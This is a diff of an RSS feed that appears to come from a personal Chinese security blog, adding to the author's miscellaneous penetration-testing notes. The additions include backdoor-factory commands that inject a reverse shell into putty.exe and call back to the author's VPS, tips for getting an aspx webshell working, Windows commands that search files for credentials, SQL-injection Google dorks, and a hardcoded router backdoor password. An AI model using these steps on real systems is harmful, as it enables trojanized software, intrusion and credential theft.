@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Thu, 21 Apr 2016 13:58:31 +0800</pubDate>
-    <lastBuildDate>Thu, 21 Apr 2016 13:58:31 +0800</lastBuildDate>
+    <pubDate>Sat, 07 May 2016 09:18:39 +0800</pubDate>
+    <lastBuildDate>Sat, 07 May 2016 09:18:39 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
     
       <item>
@@ -41,6 +41,21 @@ line2&amp;gt; 不断提升自己核心单点打击力------&amp;gt; 如针对一
                      |
                      |
                    peak
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;when feel puzzled,read these to find what you are and where you want to go:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 1.http://drops.wooyun.org/pentesting/15117
+ 2.http://www.zhihu.com/question/31905047
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;good habit:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.闲时挖洞
+2.6 items in cellphone dock:
+    知乎 feedly ihour 新浪微博 twitter English_words
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
@@ -1416,6 +1431,8 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
     quote site exec &quot;...&quot;
 &lt;span class=&quot;p&quot;&gt;4.&lt;/span&gt;账号telecomadmin密码nE7jA%5m电信猫后门
 &lt;span class=&quot;p&quot;&gt;5.&lt;/span&gt;linux local_root提权  http: // exploit.linuxnote.org/
+                        https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,unix-privesc-check)
+                        https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
   windows　https://github.com/GDSSecurity/Windows-Exploit-Suggester
 &lt;span class=&quot;p&quot;&gt;6.&lt;/span&gt;metasploit与postgresql数据库连接：msf &amp;gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
 &lt;span class=&quot;p&quot;&gt;7.&lt;/span&gt;http: // tool.chacuo.net / mailanonymous   伪造邮件发送，一小时邮箱
@@ -1678,10 +1695,15 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
    rar a /v20m /m0 newfilename web.rar
    windows find web.config==&amp;gt;for /r c:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ttp&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (web.conf?g) do (echo &lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt;&lt;span class=&quot;ge&quot;&gt;*filepath*&lt;/span&gt;&lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt; &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo %i &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; type &quot;%i&quot; &amp;gt;&amp;gt; tmp.txt &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo. &amp;gt;&amp;gt; tmp.txt)
    windows bat批处理for用法：http://blog.csdn.net/wh_19910525/article/details/7912440
+
+   findstr /R &quot;.&lt;span class=&quot;ge&quot;&gt;*sa.*&lt;/span&gt;&quot; c:&lt;span class=&quot;se&quot;&gt;\1\*&lt;/span&gt; &amp;gt; tmp.txt
 &lt;span class=&quot;p&quot;&gt;41.&lt;/span&gt;kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
 &lt;span class=&quot;p&quot;&gt;42.&lt;/span&gt;http://www.orico.com.cn/   driver    
 &lt;span class=&quot;p&quot;&gt;43.&lt;/span&gt;python中单引号，双引号，三引号http://blog.csdn.net/caianye/article/details/6638183       
-&lt;span class=&quot;p&quot;&gt;44.&lt;/span&gt;mygoogle dork：http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
+&lt;span class=&quot;p&quot;&gt;44.&lt;/span&gt;mygoogle dork：
+    site:ooxx.ooxx.ooxx syntax
+    site:... error
+    http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
    inurl:&quot;php&quot;|&quot;php page=&quot;|&quot;php id=&quot;|&quot;php tid=&quot;|&quot;php pid=&quot;|&quot;php cid=&quot;|&quot;php path=&quot;|&quot;php cmd=&quot;|&quot;php file=&quot;|&quot;php cartId=&quot;|&quot;php bookid=&quot;|&quot;php num=&quot;|&quot;php idProduct=&quot;|&quot;php ProdId=&quot;|&quot;php idCategory=&quot;|&quot;php intProdID=&quot;|&quot;cfm storeid=&quot;|&quot;php catid=&quot;|&quot;php cart_id=&quot;|&quot;php order_id=&quot;|&quot;php catalogid=&quot;|&quot;php item=&quot;|&quot;php title=&quot;|&quot;php CategoryID=&quot;|&quot;php action=&quot;|&quot;php newsID=&quot;|&quot;php newsid=&quot;|&quot;php product_id=&quot;|&quot;php cat=&quot;|&quot;php parent_id=&quot;|&quot;php view=&quot;|&quot;php itemid=&quot; site:www.facebook.com
 &lt;span class=&quot;p&quot;&gt;45.&lt;/span&gt;os.system(&#39;&#39;&#39;python %s &amp;gt;&amp;gt; &quot;out_log.txt&quot;&#39;&#39;&#39; % exp_path) &quot;&amp;gt;&amp;gt;&quot; instead of &quot;open(file,&quot;a+&quot;) fp.write(str)&quot; in py2 or py3
 &lt;span class=&quot;p&quot;&gt;46.&lt;/span&gt;tips:  
@@ -2004,6 +2026,7 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
 &lt;span class=&quot;p&quot;&gt;87.&lt;/span&gt;内网渗透：http://www.pojie567.com/blog/?post=5186
              http://www.1990day.com/regeorg-proxychains-gold-partner/
              http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
+             http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
 &lt;span class=&quot;p&quot;&gt;88.&lt;/span&gt;ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
 &lt;span class=&quot;p&quot;&gt;89.&lt;/span&gt;github pages+jekyll搭建个人博客：
         https://www.zhihu.com/question/20223939
@@ -2022,9 +2045,59 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
         http://xinghuacai.github.io
         http://reyhan.org/2013/03/jekyll-archive-without-plugins.html   jekyll archive by year
         myblog/posts-by-categories.html                                 jekyll archive by categories
+        http://www.ithome.com/html/it/195970.htm                        add music to my pages
+&lt;span class=&quot;p&quot;&gt;90.&lt;/span&gt;kali2.0使用pptp vpn时，需要在高级选项里勾选使用点到点加密,如果还不行则选择最安全的加密(128位)，否则不能成功连接，另外，用不了l2tp vpn,不知系统哪里的问题
+&lt;span class=&quot;p&quot;&gt;91.&lt;/span&gt;https://ghostbin.com/  :-&amp;gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
+                                                             from:
+                                                             http://drops.wooyun.org/pentesting/15117
+&lt;span class=&quot;p&quot;&gt;92.&lt;/span&gt;kali2安装rime输入法:https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
+                       https://wu.nerd.moe/?p=1752
+                       /usr/bin/rime_dict_manager自带词库管理工具
+                       http://www.jianshu.com/p/cffc0ea094a7
+                       https://github.com/rime/home/wiki/CustomizationGuide
+                       重新部署使配置生效:---&amp;gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx
+                       emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
+                       新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
+                       eg.my default.custom.yaml file:
+                       ---------------------start------------------------
+                            patch:
+                                menu/page_size: 9
+                                schema_list:
+&lt;span class=&quot;p&quot;&gt;                                  -&lt;/span&gt; schema: luna_pinyin
+&lt;span class=&quot;p&quot;&gt;                                  -&lt;/span&gt; schema: luna_pinyin_fluency
+&lt;span class=&quot;p&quot;&gt;                                  -&lt;/span&gt; schema: luna_pinyin_simp
+&lt;span class=&quot;p&quot;&gt;                                  -&lt;/span&gt; schema: wubi_pinyin
+&lt;span class=&quot;p&quot;&gt;                                  -&lt;/span&gt; schema: wubi86
+&lt;span class=&quot;p&quot;&gt;                                  -&lt;/span&gt; schema: emoji
+                                ascii_composer:
+                                  good_old_caps_lock: true
+                                  switch_key:
+                                    Caps_Lock: clear
+                                    Control_L: noop
+                                    Control_R: commit_text
+                                    Eisu_toggle: clear
+                                    Shift_L: commit_code
+                                    Shift_R: inline_ascii
+                      --------------------end----------------------------
+&lt;span class=&quot;p&quot;&gt;93.&lt;/span&gt;windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;amp;form=MSHOME
+&lt;span class=&quot;p&quot;&gt;94.&lt;/span&gt;backdoor-factory用法:
+&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
+                             backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
+                             backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former &#39;show&#39; command) -H vps&#39;s ip -P 200
+&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;backdoor-factory in veil:--&amp;gt;veil--&amp;gt;list--&amp;gt;number of native/backdoor-factory--&amp;gt;options--&amp;gt;set the options
+&lt;span class=&quot;p&quot;&gt;95.&lt;/span&gt;aspx大马连接报错&quot;/&quot;解决方法:http://www.asp-muma.com/?post=97
+   my way defferent from uppon one:
+   create a new folder,create a web.config file with below content:
+   --------------------------content------------------------
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;system&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;customErrors&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Off&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;/system.web&amp;gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+   --------------------------end of content----------------
+   then upon a strong webshell to my new created folder,found no more error.
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
-
 </description>
         <pubDate>Fri, 15 Apr 2016 00:00:00 +0800</pubDate>
         <link>/notes/2016/04/15/My-notes/</link>
